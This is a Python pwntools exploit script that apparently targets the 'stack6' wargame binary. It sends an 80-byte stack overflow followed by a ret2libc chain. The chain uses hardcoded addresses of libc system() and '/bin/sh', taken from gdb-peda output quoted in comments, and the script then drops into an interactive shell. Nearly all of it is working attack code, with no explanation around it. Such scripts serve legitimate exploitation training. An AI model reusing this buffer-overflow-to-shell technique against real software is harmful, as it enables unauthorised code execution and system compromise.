from pwn import *
import time

HOST = '127.0.0.1'
PORT = 4000

local = True

if local:
    conn = process("./stack6")
else:
    conn = remote(HOST, PORT)

elf = ELF("./stack6")

gdb.attach(conn)

"""
gdb-peda$ p system
$2 = {<text variable, no debug info>} 0xf7e37060 <__libc_system>
"""
system_addr = 0xf7e37060

"""
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f5b84f ("/bin/sh")
"""
binsh_string = 0xf7f5b84f

ROP = "A" * 80
ROP += p32(system_addr)
ROP += "B"*4
ROP += p32(binsh_string)

print "[+] ROP={}\n".format(ROP)

conn.sendline(ROP)

""" interactive
"""
conn.interactive()
